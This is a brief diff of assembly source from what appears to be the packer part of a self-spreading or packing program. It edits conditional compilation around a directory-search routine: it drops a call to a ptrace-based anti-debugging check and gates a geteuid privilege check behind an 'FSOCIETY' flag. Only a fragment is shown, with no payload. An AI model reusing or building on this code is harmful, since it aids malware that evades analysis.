@@ -408,11 +408,7 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 _search_dir:
-%ifndef FSOCIETY
-;	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
-%else
-	call _h3ll0w0rld + 44; jmp to ret to check for ptrace locked
-
+%ifdef FSOCIETY
 	push SYSCALL_GETEUID; geteuid
 	pop rax
 	syscall
